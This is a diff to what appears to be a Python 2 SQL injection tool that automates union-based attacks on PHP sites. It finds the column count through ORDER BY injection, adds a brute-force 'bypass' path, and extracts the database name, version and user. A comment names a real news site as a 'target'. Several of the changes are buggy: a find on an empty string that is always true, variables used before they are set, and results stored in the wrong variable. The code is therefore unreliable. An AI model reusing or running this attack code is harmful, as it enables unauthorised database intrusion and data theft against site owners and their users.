@@ -3,37 +3,12 @@
 try:
     import src.libs as lib
     from src.Colors import TextColor
-    from injection_defines import (
-        define_order_by_command_php, define_error_order_by_php, define_union_select_query_php,
-        define_database_detection_query_php, define_version_detection_query_php, define_user_detection_query_php,
-        define_get_tables_name_query_php, define_end_string_group_concat_query_php, define_get_columns_of_table_query_php,
-        define_end_string_columns_of_table_query_php, define_get_data_of_column_query_php, define_convert_query_php,
-        define_end_convert_query_php, define_get_columns_of_table_convert_query_php, define_end_columns_of_table_convert_query_php
-    )
+    from injection_defines import *
 
     from Config.WebConfig import (define_headerdata)
 except Exception as err:
     raise SystemExit, TextColor.RED + TextColor.BOLD + str("What happened :( something is wrong: %s" % (err)) \
                       + TextColor.WHITE
-
-def find_str(full, sub):
-    index = 0
-    sub_index = 0
-    position = -1
-    for ch_i,ch_f in enumerate(full) :
-        if ch_f.lower() != sub[sub_index].lower():
-            position = -1
-            sub_index = 0
-        if ch_f.lower() == sub[sub_index].lower():
-            if sub_index == 0 :
-                position = ch_i
-
-            if (len(sub) - 1) <= sub_index :
-                break
-            else:
-                sub_index += 1
-
-    return position
 
 class UnionBaseAttack(object):
     def __init__(self, url, injectedChar, firstResponse):
@@ -45,21 +20,46 @@ class UnionBaseAttack(object):
 
     def __StartAttack__(self):
         injected_method = ""
+        orderby_Bypass = False
 
+        #order by injection with error
         for item in define_order_by_command_php:
-            secondResponse = lib.requests.get(url=self.url + str(item), headers=define_headerdata)
             lib.sleep(.5)
+            secondResponse = lib.requests.get(url=self.url + str(item), headers=define_headerdata)
             if secondResponse.content.find(define_error_order_by_php[0]) is not -1:
                 injected_method = item[0:10]
                 print TextColor.CVIOLET + str("\nI working on order by injection please wait until I found they columns") + TextColor.WHITE
                 columns = self.__InjectOrderNumber__(injected_method)
                 done_str = self.url + injected_method + str(columns)
+                if columns == 1 or columns == 0:
+                    orderby_Bypass = True 
+                    break
                 print TextColor.CBEIGE + str("[+] Found => %d columns {%s}"%(columns, done_str)) + TextColor.WHITE
                 print TextColor.CVIOLET + str("\nNow I testing the union select query ...") + TextColor.WHITE
                 self.__UnionSelectQuery__(columns)
                 del (columns)
                 del (injected_method)
                 break
+            else:
+                orderby_Bypass = True
+
+        if orderby_Bypass == True:
+            print TextColor.CVIOLET + str('\nPlease wait we must bypass order by injection') + TextColor.WHITE
+
+            #http://www.dailypakistan.pk/e-paper/newsdetail.php?id=9 target
+            #order by injection with bypass %23 todo=something is wrong please check above http site to fix this below codes
+            for item in define_order_by_command_php:
+                for counter in xrange(1, 1000):
+                    lib.sleep(.5)
+                    secondResponse = lib.requests.get(url=self.url + item[0:10] + "%d --"%(counter), headers=define_headerdata)
+                    if secondResponse.content.find("Unknown column '%d' in 'order clause'"%(counter)) is not -1:
+                        done_str = self.url + item[0:10] + str(counter - 1)
+                        print TextColor.CBEIGE + str("[+] Found => %d columns {%s}"%(counter - 1, done_str)) + TextColor.WHITE
+                        print TextColor.CVIOLET + str("\nNow I testing the union select query ...") + TextColor.WHITE
+                        self.__UnionSelectQuery__(counter - 1)
+                        del (columns)
+                        break
+        
 
     def __InjectOrderNumber__ (self, injectedMethod):
         '''return count of columns that website has'''
@@ -139,46 +139,82 @@ class UnionBaseAttack(object):
         database_name = ""
         version_name = ""
 
+        #----------------------------------------------Database extracting--------------------------------------------
         #1. extarct the database name
         for item in define_database_detection_query_php:
             response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
             if response.content.find("FINDDATABASE=>") is not -1:
                 end = lib.re.search("FINDDATABASE=>", response.content).end()
                 starts = lib.re.search("<=FINDDATABASE", response.content).start()
-                print TextColor.CBEIGE2 + str("[+]Database is => ") + response.content[end:starts] + TextColor.WHITE
-                database_name = response.content[end:starts]
-                break
+                if response.content[end:starts].find("") is not -1:
+                    break
+                else:
+                    print TextColor.CBEIGE2 + str("[+]Database is => ") + response.content[end:starts] + TextColor.WHITE
+                    database_name = response.content[end:starts]
             lib.sleep(.5)
         
         lib.sleep(.5)
 
+        for item in define_database_detection_query_php_bypass:
+            response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
+            if response.content.find("'2134115356'") is not -1:
+                end = lib.re.search("'2134115356'", response.content).end()
+                starts = lib.re.search("'62134115356'", response.content).start()
+                print TextColor.CBEIGE2 + str("[+]Database is => ") + response.content[end:starts] + TextColor.WHITE
+                database_name = response.content[end:starts]
+            lib.sleep(.5)
+        #------------------------------------------------------End of Database extracting-----------------------------------------------------
+        #-----------------------------------------------Version extracting---------------------------------------------------
         #2. extract the version of database
         for item in define_version_detection_query_php:
             response = response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
             if response.content.find("FINDVERSION=>") is not -1:
                 end = lib.re.search("FINDVERSION=>", response.content).end()
                 start = lib.re.search("<=FINDVERSION", response.content).start()
-                print TextColor.CBEIGE2 + str("[+]Version of database is => ") + response.content[end:start] + TextColor.WHITE
-                version_name = response.content[end:start]
-                break
+                if response.content[end:starts].find("") is not -1:
+                    break
+                else:
+                    print TextColor.CBEIGE2 + str("[+]Version of database is => ") + response.content[end:start] + TextColor.WHITE
+                    version_name = response.content[end:start]
             lib.sleep(.5)
-        
-        lib.sleep(.5)
-        
+
+        for item in define_version_detection_query_php_bypass:
+            response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
+            if response.content.find("'2134115356'") is not -1:
+                end = lib.re.search("'2134115356'", response.content).end()
+                starts = lib.re.search("'62134115356'", response.content).start()
+                print TextColor.CBEIGE2 + str("[+]Version of database is => ") + response.content[end:starts] + TextColor.WHITE
+                database_name = response.content[end:starts]
+            lib.sleep(.5)
+
+        #----------------------------------------------End of version extracting-------------------------------------------------
+        #---------------------------------------------------------Extract User of database-------------------------------------------------
         #3. extract the user of database
         for item in define_user_detection_query_php:
             response = response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
             if response.content.find("FINDUSER=>") is not -1:
                 end = lib.re.search("FINDUSER=>", response.content).end()
                 start = lib.re.search("<=FINDUSER", response.content).start()
-                print TextColor.CBEIGE2 + str("[+]User of database is => ") + response.content[end:start] + TextColor.WHITE
-                version_name = response.content[end:start]
-                break
+                if response.content[end:starts].find("") is not -1:
+                    break
+                else:
+                    print TextColor.CBEIGE2 + str("[+]User of database is => ") + response.content[end:start] + TextColor.WHITE
+                    version_name = response.content[end:start]
             lib.sleep(.5)
 
-        lib.sleep(.5)
-
-        #4. extract the tables of database
+        lib.sleep(.5)        
+        
+        for item in define_user_detection_query_php_bypass:
+            response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
+            if response.content.find("'2134115356'") is not -1:
+                end = lib.re.search("'2134115356'", response.content).end()
+                starts = lib.re.search("'62134115356'", response.content).start()
+                print TextColor.CBEIGE2 + str("[+]User of database is => ") + response.content[end:starts] + TextColor.WHITE
+                database_name = response.content[end:starts]
+            lib.sleep(.5)
+        #---------------------------------------------------------End of Extract User of database-------------------------------------------------
+        #------------------------------------------StarTing Extracting tables of DataBaseS--------------------------------------------
+        #4.1 extract the tables of database
         tables_name = ""
         need_convert_query = False
         for counter in xrange(0, len(define_get_tables_name_query_php)):
